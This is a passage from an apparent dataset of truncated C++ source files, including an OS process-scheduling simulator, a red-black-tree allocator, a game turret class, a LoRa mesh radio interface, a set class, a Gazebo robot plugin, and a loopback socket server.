ds);\r\n \r\n    return 0;\r\n}",
    "//Ella Song\r\n#include \"SimOS.h\"\r\n#include <stdexcept>\r\n#include <algorithm>\r\n#include <iostream>\r\n\r\nSimOS::SimOS(int numberOfDisks, unsigned long long amountOfRAM, unsigned int pageSize)\r\n: currentPID(1), currentCPU(NO_PROCESS), ramSize(amountOfRAM), pageSize(pageSize), disks{numberOfDisks} {}\r\n\r\nvoid SimOS::NewProcess() {\r\n    readyQueue.push_back(currentPID);\r\n    \r\n    allProcesses[currentPID] = {currentPID};\r\n    allProcesses[currentPID].setState(\"ready\");\r\n\r\n    fillCPU();\r\n    currentPID++;\r\n}\r\n\r\nvoid SimOS::SimFork() {\r\n    NoCPUCheck();\r\n\r\n    readyQueue.push_back(currentPID);\r\n\r\n    allProcesses[currentPID] = {currentPID};\r\n    allProcesses[currentPID].setState(\"ready\");\r\n    allProcesses[currentPID].setParentPID(currentCPU);\r\n\r\n    allProcesses[currentCPU].addChildPID(currentPID);\r\n\r\n    fillCPU();\r\n    currentPID++;\r\n}\r\n\r\nvoid SimOS::SimExit() {\r\n    NoCPUCheck();\r\n\r\n    std::unordered_set<int> childrenPIDs = getFamily(currentCPU);\r\n    terminateChildren(childrenPIDs);\r\n\r\n    if (allProcesses[currentCPU].getParentPID() != 0) {\r\n        if (allProcesses[allProcesses[currentCPU].getParentPID()].getState() == \"waiting\") {\r\n            readyQueue.push_back(allProcesses[currentCPU].getParentPID());\r\n            allProcesses[readyQueue.back()].setState(\"ready\");\r\n\r\n            allProcesses[currentCPU].setState(\"terminated\");\r\n        }\r\n        else {\r\n            allProcesses[currentCPU].setState(\"zombie\");\r\n        }\r\n    }\r\n    else {\r\n        allProcesses[currentCPU].setState(\"terminated\");\r\n    }\r\n\r\n    childrenPIDs.insert(currentCPU);\r\n\r\n\r\n    currentCPU = NO_PROCESS;\r\n    fillCPU();\r\n}\r\n\r\nvoid SimOS::SimWait() {\r\n    NoCPUCheck();\r\n\r\n    std::unordered_set<int> children = allProcesses[currentCPU].getChildrenPIDs();\r\n    bool canWorkAgain = false;\r\n\r\n    for (auto child : children) {\r\n        std::string state = allProcesses[child].getState();\r\n\r\n        if (state == \"zombie\") {\r\n            std::unordered_set<int> toBeKilled = getFamily(child);\r\n            toBeKilled.insert(child);\r\n\r\n            allProcesses[child].setState(\"terminated\");\r\n            terminateChildren(toBeKilled);\r\n\r\n            canWorkAgain = true;\r\n            break;\r\n        }\r\n    }\r\n\r\n    if (!canWorkAgain) {\r\n        currentCPU = NO_PROCESS;\r\n    }\r\n\r\n    fillCPU();\r\n}\r\n\r\nvoid SimOS::TimerInterrupt() {\r\n    NoCPUCheck();\r\n\r\n    readyQueue.push_back(currentCPU);\r\n    allProcesses[currentCPU].setState(\"ready\");\r\n\r\n    currentCPU = NO_PROCESS;\r\n    fillCPU();\r\n}\r\n\r\nvoid SimOS::DiskReadRequest(int diskNumber, std::string fileName) {\r\n    InvalidDiskCheck(diskNumber);\r\n    NoCPUCheck();\r\n\r\n    FileReadRequest request{currentCPU, fileName};\r\n    disks[diskNumber].addIOFile(request);\r\n    allProcesses[currentCPU].setState(\"waiting\");\r\n\r\n    currentCPU = NO_PROCESS;\r\n    fillCPU();\r\n}\r\n\r\nvoid SimOS::DiskJobCompleted(int diskNumber) {\r\n    InvalidDiskCheck(diskNumber);\r\n\r\n    readyQueue.push_back(disks[diskNumber].getIOFile().PID);\r\n    disks[diskNumber].removeIOFile();\r\n\r\n    fillCPU();\r\n}\r\n\r\nvoid SimOS::AccessMemoryAddress(unsigned long long address) {\r\n    NoCPUCheck();\r\n\r\n    unsigned long long pageNumber = address / pageSize;\r\n    bool pageInMemory = false;\r\n\r\n    for (MemoryItem& item : memUsage) {\r\n        if (item.PID == currentCPU && item.pageNumber == pageNumber) {\r\n            pageInMemory = true;\r\n            item.frameNumber = address % pageSize;\r\n            break;\r\n        }\r\n    }\r\n\r\n    if (!pageInMemory) {\r\n        if (memUsage.size() * pageSize >= ramSize) {\r\n            memUsage.erase(memUsage.begin());\r\n        }\r\n\r\n        MemoryItem newItem{pageNumber, address % pageSize, currentCPU};\r\n        memUsage.push_back(newItem);\r\n    }\r\n}\r\n\r\nint SimOS::GetCPU() {\r\n    return currentCPU;\r\n}\r\n\r\nstd::deque<int> SimOS::GetReadyQueue() {\r\n    return readyQueue;\r\n}\r\n\r\n//\r\nMemoryUsage SimOS::GetMemory() {\r\n    MemoryUsage ram;\r\n\r\n    for (auto item : memUsage) {\r\n        std::string status = allProcesses[item.PID].getState();\r\n\r\n        if (status != \"terminated\") {\r\n            ram.push_back(item);\r\n        }\r\n    }\r\n\r\n    return ram;\r\n}\r\n\r\nFileReadRequest SimOS::GetDisk(int diskNumber) {\r\n    InvalidDiskCheck(diskNumber);\r\n    return disks[diskNumber].getIOFile();\r\n}\r\n\r\nstd::deque<FileReadRequest> SimOS::GetDiskQueue(int diskNumber) {\r\n    InvalidDiskCheck(diskNumber);\r\n    return disks[diskNumber].getIOQueue();\r\n}\r\n\r\nvoid SimOS::terminateChildren(std::unordered_set<int>& childrenPIDs) {\r\n    terminateReadyQueueChildren(childrenPIDs);\r\n    \r\n    for (int i = 0; i < disks.size(); ++i) {\r\n        disks[i].terminateChildrenRequests(childrenPIDs);\r\n    }\r\n\r\n    childrenPIDs.insert(currentCPU);\r\n    terminateRAMChildren(childrenPIDs);\r\n}\r\nvoid SimOS::terminateReadyQueueChildren(const std::unordered_set<int>& childrenPIDs) {\r\n    if (!currentCPU != NO_PROCESS && childrenPIDs.find(currentCPU) != childrenPIDs.end()) {\r\n        allProcesses[currentCPU].setState(\"terminated\");\r\n        currentCPU = NO_PROCESS;\r\n    }\r\n\r\n    if ",
    "#include <not_implemented.h>\n\n#include \"../include/allocator_red_black_tree.h\"\n\nallocator_red_black_tree::~allocator_red_black_tree()\n{\n    get_mutex().~mutex();\n    deallocate_with_guard(_trusted_memory);\n}\n\nallocator_red_black_tree::allocator_red_black_tree(\n    allocator_red_black_tree &&other) noexcept\n{\n    _trusted_memory = std::exchange(other._trusted_memory, nullptr);\n}\n\nallocator_red_black_tree &allocator_red_black_tree::operator=(\n    allocator_red_black_tree &&other) noexcept\n{\n    std::swap(_trusted_memory, other._trusted_memory);\n    return *this;\n}\n\nallocator_red_black_tree::allocator_red_black_tree(\n    size_t space_size,\n    allocator *parent_allocator,\n    logger *logger,\n    allocator_with_fit_mode::fit_mode allocate_fit_mode)\n{\n    if (space_size < free_block_metadata_size)\n    {\n        throw std::logic_error(\"To small space\");\n    }\n\n    size_t real_size = space_size + allocator_metadata_size;\n\n    _trusted_memory = (parent_allocator == nullptr) ? ::operator new(real_size) : parent_allocator->allocate(real_size, 1);\n\n    auto logger_ptr = reinterpret_cast<class logger**>(_trusted_memory);\n\n    *logger_ptr = logger;\n\n    auto parent_allocator_ptr = reinterpret_cast<allocator**>(logger_ptr + 1);\n\n    *parent_allocator_ptr = parent_allocator;\n\n    auto fit_mode_ptr = reinterpret_cast<allocator_with_fit_mode::fit_mode*>(parent_allocator_ptr + 1);\n\n    *fit_mode_ptr = allocate_fit_mode;\n\n    auto size_ptr = reinterpret_cast<size_t*>(fit_mode_ptr + 1);\n\n    *size_ptr = space_size;\n\n    auto mutex_ptr = reinterpret_cast<std::mutex*>(size_ptr + 1);\n\n    construct(mutex_ptr);\n\n    auto first_block_ptr = reinterpret_cast<void**>(mutex_ptr + 1);\n\n    *first_block_ptr = reinterpret_cast<std::byte*>(_trusted_memory) + allocator_metadata_size;\n\n    auto block_data_ptr = reinterpret_cast<void*>(reinterpret_cast<std::byte*>(_trusted_memory) + allocator_metadata_size);\n\n\tget_data_from_block(block_data_ptr).color = block_color::BLACK;\n\tget_data_from_block(block_data_ptr).occupied = false;\n\tget_parent_from_block(block_data_ptr) = nullptr;\n\tget_back_from_block(block_data_ptr) = nullptr;\n\tget_forward_from_block(block_data_ptr) = nullptr;\n\tget_left_from_block(block_data_ptr) = nullptr;\n\tget_right_from_block(block_data_ptr) = nullptr;\n}\n\n[[nodiscard]] void *allocator_red_black_tree::allocate(\n    size_t value_size,\n    size_t values_count)\n{\n    std::lock_guard lock(get_mutex());\n\n    size_t real_size = value_size * values_count;\n\n    debug_with_guard(\"Allocator red black tree started allocating \" + std::to_string(real_size) + \" bytes\");\n\n    void* current_free;\n\n    switch (get_fit_mod())\n    {\n        case allocator_with_fit_mode::fit_mode::first_fit:\n            current_free = get_first(real_size);\n            break;\n        case allocator_with_fit_mode::fit_mode::the_best_fit:\n            current_free = get_best(real_size);\n            break;\n        case allocator_with_fit_mode::fit_mode::the_worst_fit:\n            current_free = get_worst(real_size);\n            break;\n    }\n\n    if (current_free == nullptr)\n    {\n        error_with_guard(\"Allocator red black tree throwing bad_alloc while trying to allocate \" + std::to_string(real_size) + \" bytes\");\n        throw std::bad_alloc();\n    }\n\n    remove(current_free);\n\n//\tprint_tree(*get_first_block_ptr(_trusted_memory));\n\n    get_data_from_block(current_free).occupied = true;\n\tget_parent_from_block(current_free) = _trusted_memory;\n\n    size_t free_block_size = get_block_size(current_free, _trusted_memory);\n\n    bool need_fraq = true;\n\n    if (free_block_size < real_size + free_block_metadata_size)\n    {\n        warning_with_guard(\"Allocator red black tree changed allocating block size to \" + std::to_string(free_block_size));\n        real_size = free_block_size;\n        need_fraq = false;\n    }\n\n    if (need_fraq)\n    {\n        void* new_free_block = reinterpret_cast<std::byte*>(current_free) + occupied_block_metadata_size + real_size;\n\n        get_forward_from_block(new_free_block) = get_forward_from_block(current_free);\n        get_back_from_block(new_free_block) = current_free;\n\n        get_forward_from_block(current_free) = new_free_block;\n        if (get_forward_from_block(new_free_block) != nullptr)\n            get_back_from_block(get_forward_from_block(new_free_block)) = new_free_block;\n\n        get_data_from_block(new_free_block).occupied = false;\n\t\tget_parent_from_block(new_free_block) = nullptr;\n\n        insert(new_free_block);\n    }\n\n    information_with_guard(std::to_string(get_free_size()));\n    debug_with_guard(print_blocks());\n//\tprint_tree(*get_first_block_ptr(_trusted_memory));\n\n\tdebug_with_guard(\"Allocator red black tree finished allocating\");\n    return reinterpret_cast<std::byte*>(current_free) + occupied_block_metadata_size;\n}\n\nsize_t allocator_red_black_tree::get_free_size() const noexcept\n{\n    size_t accum = 0;\n\n    for (auto it = begin(), sent = end(); it != sent; ++it)\n    {\n        if (!it.occupied())\n            accum += it.size()",
    "#include \"Turret.h\"\n#include <iostream>\n#include \"raymath.h\"\n#include \"types.h\"\n#include \"helpers.h\"\n#include \"TurretBullet.h\"\n#include \"ShockwaveBullet.h\"\n#include \"FireBullet.h\"\n#include \"textures.h\" \n\nTurret::Turret()\n{\n    this->angle = 0;\n\n    //Texture init\n    this->texture = &textures[1];\n    this->textureWidth = this->texture->width;\n    this->textureHeight = this->texture->height;\n    this->textureSourceRec = { 0.0f, 0.0f, (float)this->textureWidth, (float)this->textureHeight };\n    this->textureDestRec = { this->position.x, this->position.y, (float)this->textureWidth, (float)this->textureHeight };\n    this->textureOriginPoint = { this->textureWidth / 2.0f, this->textureHeight / 2.0f + 10.0f };\n\n    //gun settings\n    this->bulletSpeedMultiplier = 1.0f;\n\n    this->baseFirerate = 1.5f; // in shots per second for turretBullet\n    this->currentFirerate = this->baseFirerate;\n    this->rapidFirerate = this->baseFirerate * 3.0f;\n    this->rapidFireFrames = 0;\n\n    this->baseSpecialFirerate = 1.0f;\n    this->currentSpecialFirerate = this->baseSpecialFirerate;\n    this->rapidSpecialFirerate = this->baseSpecialFirerate * 3.0f;\n    this->specialRapidfireFrames = 0;\n\n    \n    //initate bullet cooldown map\n    for (int i = 1; i <= 3; i++)\n    {\n        this->bulletCooldownMap[i] = new BulletCooldownInfo();\n        this->bulletCooldownMap[i]->canShoot = true;\n        this->bulletCooldownMap[i]->lastShotFrame = 0;\n        this->bulletCooldownMap[i]->shotThisFrame = false;\n    }\n\n    \n\n}\n\nvoid Turret::Draw()\n{\n    DrawTexturePro(*this->texture, this->textureSourceRec, this->textureDestRec, this->textureOriginPoint, this->angle * RAD2DEG + 90.0f, WHITE);\n}\n\nvoid Turret::Update(unsigned int frame, int mouseX, int mouseY)\n{\n    //update its angle\n    this->UpdateAngle(mouseX, mouseY);\n\n    if (this->rapidFireFrames > 0)\n    {\n        this->currentFirerate = this->rapidFirerate;\n        this->rapidFireFrames -= 1;\n    }\n         \n    else this->currentFirerate = this->baseFirerate;\n\n\n    if (this->specialRapidfireFrames > 0)\n    {\n        this->currentSpecialFirerate = this->rapidSpecialFirerate;\n        this->specialRapidfireFrames -= 1;\n    }\n\n    else this->currentSpecialFirerate = this->baseSpecialFirerate;\n\n\n    //update bullet cooldowns\n\n    //go through each bullet type\n    for (auto& pair : this->bulletCooldownMap)\n    {\n        //if this was the frame it shot, update its last shot frame.\n        if (pair.second->shotThisFrame)\n        {\n            pair.second->lastShotFrame = frame;\n            pair.second->shotThisFrame = false;\n        }\n\n        //check if bullet can be put off cooldown based on its last shot frame\n\n        //check bullet id 1 (TurretBullet)\n        if (pair.first == 1) \n        {\n            //if its been long enough. set canShoot to be true in its BulletCooldownInfo.\n            if (frame - pair.second->lastShotFrame > 60 / this->currentFirerate) pair.second->canShoot = true;\n        }\n\n        //shockwave bullet\n        else if (pair.first == 2) //not affected by firerate rn, figure a cool implelention maybe\n        {\n            if (frame - pair.second->lastShotFrame > 150 / this->currentSpecialFirerate) pair.second->canShoot = true;\n        }\n\n        //Firebullet\n        else if (pair.first == 3) //not affected by firerate rn, figure a cool implelention maybe\n        {\n            if (frame - pair.second->lastShotFrame > 180 / this->currentSpecialFirerate) pair.second->canShoot = true;\n        }\n        \n    }\n\n    //check if turret shot can be put off cooldown\n    // base case: 1 firerate is 1 shot every second\n\n    //       v time from last shot\n    //if (frame - this->lastShotFrame > 60 / this->firerate) canShoot = true; //old\n\n    //NEW map is id : BulletCooldownInfo struct, go thorugh each and set the canShoots for each based on lastShot frame and firerate.\n\n}\n\nvoid Turret::UpdateAngle(int mouseX, int mouseY)\n{\n    this->angle = CalculateAngle(this->position.x, this->position.y, mouseX, mouseY);\n}\n\nvoid Turret::ShootBullet(std::vector<Bullet*>& bullets, int id)\n{\n    Bullet* b;\n\n    //create a new bullet based on id\n    switch (id)\n    {\n    case 1:\n        b = new TurretBullet();\n        break;\n\n    case 2:\n        b = new ShockwaveBullet();\n        break;\n\n    case 3:\n        b = new FireBullet();\n        break;\n\n    default: //fallback to turretbbullet on failure\n        b = new TurretBullet();\n        std::cout << \"Could not find that bullet id. Shooting TurretBullet.\\n\";\n        break;\n    }\n\n    //set its pos and velocity\n    b->SetPosition(this->position.x, this->position.y);\n    b->SetCurrentVelocity(b->GetBaseSpeed() * this->bulletSpeedMultiplier * cosf(this->angle), b->GetBaseSpeed() * this->bulletSpeedMultiplier * sinf(this->angle));\n\n    bullets.push_back(b);\n    \n    //update this bullet id's cooldowns\n    this->bulletCooldownMap[id]->canShoot = false;\n    this->bulletCooldownMap[id]->shotThisFrame = true;\n}\n\nvoid Turret::SetBulletSpeedMultiplier(float multiplier",
    "#include \"RadioLibInterface.h\"\n#include \"MeshTypes.h\"\n#include \"NodeDB.h\"\n#include \"SPILock.h\"\n#include \"configuration.h\"\n#include \"error.h\"\n#include \"main.h\"\n#include \"mesh-pb-constants.h\"\n#include <pb_decode.h>\n#include <pb_encode.h>\n\nvoid LockingArduinoHal::spiBeginTransaction()\n{\n    spiLock->lock();\n\n    ArduinoHal::spiBeginTransaction();\n}\n\nvoid LockingArduinoHal::spiEndTransaction()\n{\n    spiLock->unlock();\n\n    ArduinoHal::spiEndTransaction();\n}\n#if ARCH_PORTDUINO\nvoid LockingArduinoHal::spiTransfer(uint8_t *out, size_t len, uint8_t *in)\n{\n    spi->transfer(out, in, len);\n}\n#endif\n\nRadioLibInterface::RadioLibInterface(LockingArduinoHal *hal, RADIOLIB_PIN_TYPE cs, RADIOLIB_PIN_TYPE irq, RADIOLIB_PIN_TYPE rst,\n                                     RADIOLIB_PIN_TYPE busy, PhysicalLayer *_iface)\n    : NotifiedWorkerThread(\"RadioIf\"), module(hal, cs, irq, rst, busy), iface(_iface)\n{\n    instance = this;\n#if defined(ARCH_STM32WL) && defined(USE_SX1262)\n    module.setCb_digitalWrite(stm32wl_emulate_digitalWrite);\n    module.setCb_digitalRead(stm32wl_emulate_digitalRead);\n#endif\n}\n\n#ifdef ARCH_ESP32\n// ESP32 doesn't use that flag\n#define YIELD_FROM_ISR(x) portYIELD_FROM_ISR()\n#else\n#define YIELD_FROM_ISR(x) portYIELD_FROM_ISR(x)\n#endif\n\nvoid INTERRUPT_ATTR RadioLibInterface::isrLevel0Common(PendingISR cause)\n{\n    instance->disableInterrupt();\n\n    BaseType_t xHigherPriorityTaskWoken;\n    instance->notifyFromISR(&xHigherPriorityTaskWoken, cause, true);\n\n    /* Force a context switch if xHigherPriorityTaskWoken is now set to pdTRUE.\n    The macro used to do this is dependent on the port and may be called\n    portEND_SWITCHING_ISR. */\n    YIELD_FROM_ISR(xHigherPriorityTaskWoken);\n}\n\nvoid INTERRUPT_ATTR RadioLibInterface::isrRxLevel0()\n{\n    isrLevel0Common(ISR_RX);\n}\n\nvoid INTERRUPT_ATTR RadioLibInterface::isrTxLevel0()\n{\n    isrLevel0Common(ISR_TX);\n}\n\n/** Our ISR code currently needs this to find our active instance\n */\nRadioLibInterface *RadioLibInterface::instance;\n\n/** Could we send right now (i.e. either not actively receiving or transmitting)? */\nbool RadioLibInterface::canSendImmediately()\n{\n    // We wait _if_ we are partially though receiving a packet (rather than just merely waiting for one).\n    // To do otherwise would be doubly bad because not only would we drop the packet that was on the way in,\n    // we almost certainly guarantee no one outside will like the packet we are sending.\n    bool busyTx = sendingPacket != NULL;\n    bool busyRx = isReceiving && isActivelyReceiving();\n\n    if (busyTx || busyRx) {\n        if (busyTx) {\n            LOG_WARN(\"Can not send yet, busyTx\\n\");\n        }\n        // If we've been trying to send the same packet more than one minute and we haven't gotten a\n        // TX IRQ from the radio, the radio is probably broken.\n        if (busyTx && (millis() - lastTxStart > 60000)) {\n            LOG_ERROR(\"Hardware Failure! busyTx for more than 60s\\n\");\n            RECORD_CRITICALERROR(meshtastic_CriticalErrorCode_TRANSMIT_FAILED);\n            // reboot in 5 seconds when this condition occurs.\n            rebootAtMsec = lastTxStart + 65000;\n        }\n        if (busyRx) {\n            LOG_WARN(\"Can not send yet, busyRx\\n\");\n        }\n        return false;\n    } else\n        return true;\n}\n\n/// Send a packet (possibly by enquing in a private fifo).  This routine will\n/// later free() the packet to pool.  This routine is not allowed to stall because it is called from\n/// bluetooth comms code.  If the txmit queue is empty it might return an error\nErrorCode RadioLibInterface::send(meshtastic_MeshPacket *p)\n{\n\n#ifndef DISABLE_WELCOME_UNSET\n\n    if (config.lora.region != meshtastic_Config_LoRaConfig_RegionCode_UNSET) {\n        if (disabled || !config.lora.tx_enabled) {\n            LOG_WARN(\"send - !config.lora.tx_enabled\\n\");\n            packetPool.release(p);\n            return ERRNO_DISABLED;\n        }\n\n    } else {\n        LOG_WARN(\"send - lora tx disable because RegionCode_Unset\\n\");\n        packetPool.release(p);\n        return ERRNO_DISABLED;\n    }\n\n#else\n\n    if (disabled || !config.lora.tx_enabled) {\n        LOG_WARN(\"send - !config.lora.tx_enabled\\n\");\n        packetPool.release(p);\n        return ERRNO_DISABLED;\n    }\n\n#endif\n\n    // Sometimes when testing it is useful to be able to never turn on the xmitter\n#ifndef LORA_DISABLE_SENDING\n    printPacket(\"enqueuing for send\", p);\n\n    LOG_DEBUG(\"txGood=%d,rxGood=%d,rxBad=%d\\n\", txGood, rxGood, rxBad);\n    ErrorCode res = txQueue.enqueue(p) ? ERRNO_OK : ERRNO_UNKNOWN;\n\n    if (res != ERRNO_OK) { // we weren't able to queue it, so we must drop it to prevent leaks\n        packetPool.release(p);\n        return res;\n    }\n\n    // set (random) transmit delay to let others reconfigure their radio,\n    // to avoid collisions and implement timing-based flooding\n    // LOG_DEBUG(\"Set random delay before transmitting.\\n\");\n    setTransmitDelay();\n\n    return res;\n#else\n    packetPool.release(p);\n    return ERRNO_DISABLED;\n#endif\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nclass SET\r\n{\r\npublic:\r\n    vector<int> elements;\r\n\r\n    int findPosition(int data) const\r\n    {\r\n        int left = 0;\r\n        int right = elements.size() - 1;\r\n\r\n        while (left <= right)\r\n        {\r\n            int mid = left + (right - left) / 2;\r\n\r\n            if (elements[mid] == data)\r\n            {\r\n                return -1; \r\n            }\r\n            else if (elements[mid] < data)\r\n            {\r\n                left = mid + 1;\r\n            }\r\n            else\r\n            {\r\n                right = mid - 1;\r\n            }\r\n        }\r\n\r\n        return left; \r\n    }\r\n\r\n    void insertElementAt(int pos, int data)\r\n    {\r\n        elements.push_back(0);\r\n        for (int i = elements.size() - 1; i > pos; --i)\r\n        {\r\n            elements[i] = elements[i - 1];\r\n        }\r\n        elements[pos] = data;\r\n    }\r\n\r\n    void removeElementAt(int pos)\r\n    {\r\n        for (int i = pos; i < elements.size() - 1; ++i)\r\n        {\r\n            elements[i] = elements[i + 1];\r\n        }\r\n        elements.pop_back();\r\n    }\r\n\r\n    int binary_search(const std::vector<int> &arr, int target)\r\n    {\r\n        int left = 0;\r\n        int right = arr.size() - 1;\r\n\r\n        while (left <= right)\r\n        {\r\n            int mid = left + (right - left) / 2;\r\n\r\n            if (arr[mid] == target)\r\n            {\r\n                return mid;\r\n            }\r\n            else if (arr[mid] < target)\r\n            {\r\n                left = mid + 1;\r\n            }\r\n            else\r\n            {\r\n                right = mid - 1;\r\n            }\r\n        }\r\n\r\n        return -1;\r\n    }\r\n\r\npublic:\r\n    void commands(int command, int data, SET &set_2)\r\n    {\r\n        \r\n        switch (command)\r\n        {\r\n        case 1:\r\n        { // Insert\r\n            int pos = findPosition(data);\r\n            if (pos != -1)\r\n            {\r\n                insertElementAt(pos, data);\r\n            }\r\n            cout << elements.size() << endl;\r\n            break;\r\n        }\r\n        case 2:\r\n        { // Delete\r\n            int pos = binary_search(elements, data);\r\n\r\n            if (pos == -1)\r\n            {\r\n                cout << elements.size() << endl; // Element doesn't exist in the set\r\n            }\r\n            else\r\n            {\r\n                removeElementAt(pos);\r\n                cout << elements.size() << \"\\n\";\r\n            }\r\n            break;\r\n        }\r\n        case 3:\r\n        { // Belongs To\r\n            int pos = binary_search(elements, data);\r\n            if (pos == -1)\r\n            {\r\n                cout << 0 << endl;\r\n            }\r\n            else\r\n            {\r\n                cout << 1 << endl;\r\n            }\r\n            break;\r\n        }\r\n        case 4:\r\n        { // Union\r\n\r\n            vector<int> result;\r\n            auto &set1 = elements;\r\n            auto &set2 = set_2.elements;\r\n            int i = 0, j = 0;\r\n            while (i < set1.size() && j < set2.size())\r\n            {\r\n                if (set1[i] < set2[j])\r\n                {\r\n                    result.push_back(set1[i++]);\r\n                }\r\n                else if (set1[i] > set2[j])\r\n                {\r\n                    result.push_back(set2[j++]);\r\n                }\r\n                else\r\n                {\r\n                    result.push_back(set1[i++]);\r\n                    j++;\r\n                }\r\n            }\r\n            while (i < set1.size())\r\n            {\r\n                result.push_back(set1[i++]);\r\n            }\r\n            while (j < set2.size())\r\n            {\r\n                result.push_back(set2[j++]);\r\n            }\r\n            elements = result;\r\n            cout << result.size() << \"\\n\";\r\n            break;\r\n        }\r\n        case 5:\r\n        { // Intersection\r\n            vector<int> result;\r\n            auto &set1 = elements;\r\n            auto &set2 = set_2.elements;\r\n            int i = 0, j = 0;\r\n            while (i < set1.size() && j < set2.size())\r\n            {\r\n                if (set1[i] < set2[j])\r\n                {\r\n                    i++;\r\n                }\r\n                else if (set1[i] > set2[j])\r\n                {\r\n                    j++;\r\n                }\r\n                else\r\n                {\r\n                    result.push_back(set1[i++]);\r\n                    j++;\r\n                }\r\n            }\r\n            elements = result;\r\n            cout << result.size() << \"\\n\";\r\n            break;\r\n        }\r\n        case 6:\r\n        { // Size\r\n            cout << elements.size() << \"\\n\";\r\n            break;\r\n        }\r\n        case 7:\r\n        { // Difference\r\n            vector<int> result;\r\n            auto &set1 = elements;\r\n            auto &set2 = set_2.elements;\r\n            int i = 0, j = 0;\r\n            while (i < set1.size() && j < set2.size())\r\n            {\r\n                if (set1[i] < set2[j])\r\n                {\r\n                    result.push_back(set1[i++]);\r\n                }\r\n                else if (set1[i",
    "#include <ismr24_system/ismr24_system.hpp>\n\n#include <ignition/plugin/Register.hh>\n\n#include <ignition/gazebo/components/JointVelocityCmd.hh>\n\nismr24_system::ismr24_system(){\n  std::cout << \"constructor\" << std::endl;\n  enabled=true;\n  joint = 0;\n}\nismr24_system::~ismr24_system(){}\n\nvoid ismr24_system::Configure( const ignition::gazebo::Entity& entity,\n\t\t\t    const std::shared_ptr<const sdf::Element>& sdf,\n\t\t\t    ignition::gazebo::EntityComponentManager&,\n\t\t\t    ignition::gazebo::EventManager&){\n\n  std::cout << \"configure\" << std::endl;\n  model = ignition::gazebo::Model(entity);\n\n  std::cout << sdf->ToString(\"element\") << std::endl;\n\n  if( sdf->HasElement(\"max_velocity\") ){\n    const double maxVel = sdf->Get<double>(\"max_velocity\");\n    std::cout << \"max velocity: \" << maxVel << std::endl;\n  }\n\n  if( sdf->HasElement(\"topic\") ){\n    std::string topic = sdf->Get<std::string>(\"topic\");\n    std::cout << \"topic: \" << topic << std::endl;\n    if( node.Subscribe(topic, &ismr24_system::callback, this ) ){\n      std::cout << \"Created subscriber\" << std::endl;\n    }\n  }\n\n  auto ptr = const_cast<sdf::Element*>(sdf.get());\n  if( sdf->HasElement(\"joint\") ){\n    joint_name = ptr->GetElement(\"joint\")->Get<std::string>();\n    std::cout << \"joint: \" << joint_name << std::endl;\n  }\n  \n}\n\nvoid ismr24_system::callback( const ignition::msgs::Boolean& msg ){\n  std::cout << msg.data() << std::endl;\n  enabled = msg.data();\n}\n\nvoid ismr24_system::PreUpdate( const ignition::gazebo::UpdateInfo&,\n\t\t\t    ignition::gazebo::EntityComponentManager& ecm ){\n  if( joint == 0 ){\n    joint = model.JointByName( ecm, joint_name );\n    std::cout << \"Model: \" << model.Name(ecm)\n\t      << \" has \" << model.LinkCount(ecm)\n\t      << \" links and \" << model.JointCount(ecm)\n\t      << \" joints \" << std::endl;\n  }\n\n  auto vel = ecm.Component<ignition::gazebo::components::JointVelocityCmd>(joint);\n  if( vel == nullptr ){\n    ecm.CreateComponent(joint,ignition::gazebo::components::JointVelocityCmd({joint_speed}));\n  }\n  else{\n    *vel = ignition::gazebo::components::JointVelocityCmd({joint_speed});\n  }\n  \n}\n\nvoid ismr24_system::Update( const ignition::gazebo::UpdateInfo&,\n\t\t\t ignition::gazebo::EntityComponentManager& ){}\n\nvoid ismr24_system::PostUpdate( const ignition::gazebo::UpdateInfo&,\n\t\t\t     const ignition::gazebo::EntityComponentManager&){\n\n  static double t=0.0;\n  if( enabled ){\n    joint_speed = sin(t)/10;\n    t+=0.001;\n  }\n  else{\n    joint_speed = 0.0;\n  }\n  \n}\n\nIGNITION_ADD_PLUGIN( ismr24_system,\n\t\t     ignition::gazebo::System,\n\t\t     ismr24_system::ISystemConfigure,\n\t\t     ismr24_system::ISystemPreUpdate,\n\t\t     ismr24_system::ISystemUpdate,\n\t\t     ismr24_system::ISystemPostUpdate )\n\n",
    "#include <iostream>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <netinet/in.h>\n\nstruct Command {\n    int commandType = 1;\n};\n\nCommand command;\n\nclass Server {\n    int serverSock;\n    int clientSock;\npublic:\n    Server() : serverSock(-1), clientSock(-1) {}\n\n    ~Server() { StopServer(); }\n\n    void StartServer() {\n        serverSock = socket(AF_INET, SOCK_STREAM, 0);\n\n        if (serverSock == -1) \n        {\n            std::cerr << \"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0441\u043e\u043a\u0435\u0442\" << std::endl;\n            exit(1);\n        }\n\n        struct sockaddr_in serverAddress{};\n        serverAddress.sin_family = AF_INET;\n        serverAddress.sin_addr.s_addr = INADDR_LOOPBACK;\n        serverAddress.sin_port = htons(INADDR_LOOPBACK);\n\n        if (bind(serverSock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {\n            std::cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438\u0432\u044f\u0437\u043a\u0438 \u0441\u043e\u043a\u0435\u0442\u0430 \u043a \u0430\u0434\u0440\u0435\u0441\u0443 \u0438 \u043f\u043e\u0440\u0442\u0443\" << std::endl;\n            exit(1);\n        }\n\n        std::cout << \"\u0421\u0435\u0440\u0432\u0435\u0440 \u0437\u0430\u043f\u0443\u0449\u0435\u043d. \u041e\u0436\u0438\u0434\u0430\u043d\u0438\u0435 \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f \u043a\u043b\u0438\u0435\u043d\u0442\u0430...\" << std::endl;\n\n        if (listen(serverSock, 1) < 0) {\n            std::cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u043d\u0438\u0438 \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0445 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0439\" << std::endl;\n            exit(1);\n        }\n\n        sockaddr_in clientAddress{};\n        socklen_t clientAddressSize = sizeof(clientAddress);\n\n        clientSock = accept(serverSock, (struct sockaddr *)&clientAddress, &clientAddressSize);\n        if (clientSock < 0) {\n            std::cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u0440\u0438\u043d\u044f\u0442\u0438\u0438 